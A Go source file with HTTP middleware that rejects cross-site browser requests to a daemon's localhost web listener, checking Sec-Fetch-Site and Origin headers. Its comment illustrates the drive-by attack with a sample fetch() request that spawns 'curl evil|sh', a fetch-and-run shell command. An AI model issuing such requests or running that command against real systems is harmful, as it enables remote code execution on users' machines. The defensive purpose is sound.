package server

import (
	"net/http"
	"net/url"
	"strings"
)

// browserCrossSiteGuard wraps the handler served on the OPTIONAL localhost TCP
// listener (the `--http-port` web-terminal-viewer surface) and rejects requests
// that carry a browser cross-site signal.
//
// The daemon serves one mux on both the 0600 unix socket and the optional
// unauthenticated localhost TCP listener. That mux includes process-spawning
// routes (POST /api/agents/spawn shells a caller-supplied command, plus
// session/job input, session delete, /api/env/up, /api/build/submit). No
// handler performs any Origin/CORS/CSRF/Content-Type validation, and the
// spawn/input bodies are decoded straight from r.Body. A POST of a JSON body is
// a CORS-"simple" request, so a web page the user merely visits can issue
//
//	fetch('http://localhost:<port>/api/agents/spawn',
//	      {method:'POST', mode:'no-cors', body:'{"job_id":"x","command":"curl evil|sh"}'})
//
// which the browser sends WITHOUT a preflight — a drive-by RCE that never needs
// to read the response. This guard closes that vector on the TCP surface while
// leaving the unix socket path (native clients, the grove CLI) completely
// untouched: it is applied only to the TCP http.Server.Handler.
//
// A request is rejected when it carries a browser cross-site marker:
//   - Sec-Fetch-Site is "cross-site" or "same-site" (set by every modern
//     browser on the request line and not settable by page JavaScript; only
//     "same-origin" and "none" — a direct navigation — are trusted), or
//   - an Origin header is present whose host:port is not the request's own Host
//     (the pre-Sec-Fetch-Site fallback; a same-origin viewer fetch always sends
//     an Origin equal to its Host).
//
// Native clients (grove CLI, curl, any plain Go http.Client) send neither
// header and pass through unchanged.
func browserCrossSiteGuard(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if reason, blocked := crossSiteRequestReason(r); blocked {
			http.Error(w, "forbidden: cross-site browser request rejected ("+reason+")", http.StatusForbidden)
			return
		}
		next.ServeHTTP(w, r)
	})
}

// crossSiteRequestReason reports whether r carries a browser cross-site marker
// and, if so, a short human-readable reason for the log/response. It is the
// pure predicate behind browserCrossSiteGuard, split out so it can be tested
// directly.
func crossSiteRequestReason(r *http.Request) (reason string, blocked bool) {
	// Sec-Fetch-Site is the primary, unspoofable signal: browsers stamp it on
	// every fetch/XHR and forbid page JS from overriding it. "same-origin" and
	// "none" (a user-typed navigation) are the only trusted values.
	switch strings.ToLower(strings.TrimSpace(r.Header.Get("Sec-Fetch-Site"))) {
	case "cross-site", "same-site":
		return "Sec-Fetch-Site: " + strings.TrimSpace(r.Header.Get("Sec-Fetch-Site")), true
	}

	// Origin fallback for any browser/proxy that omits Sec-Fetch-Site: reject
	// when an Origin is present and its host does not match the request Host. A
	// legitimate same-origin viewer fetch always sends Origin == its own Host;
	// a cross-site POST sends the attacker's Origin (or "null" for a sandboxed
	// document), neither of which matches.
	if origin := strings.TrimSpace(r.Header.Get("Origin")); origin != "" {
		if !originMatchesHost(origin, r.Host) {
			return "cross-origin Origin: " + origin, true
		}
	}

	return "", false
}

// originMatchesHost reports whether the Origin header value is same-origin with
// the request's Host. The comparison is a strict, case-insensitive host:port
// match — the daemon's TCP surface is only ever served from a single localhost
// origin, so anything that is not that exact origin (a different scheme's
// default port, a different localhost port, the literal "null") is treated as
// cross-origin.
func originMatchesHost(origin, host string) bool {
	u, err := url.Parse(origin)
	if err != nil || u.Host == "" {
		return false
	}
	return strings.EqualFold(u.Host, host)
}
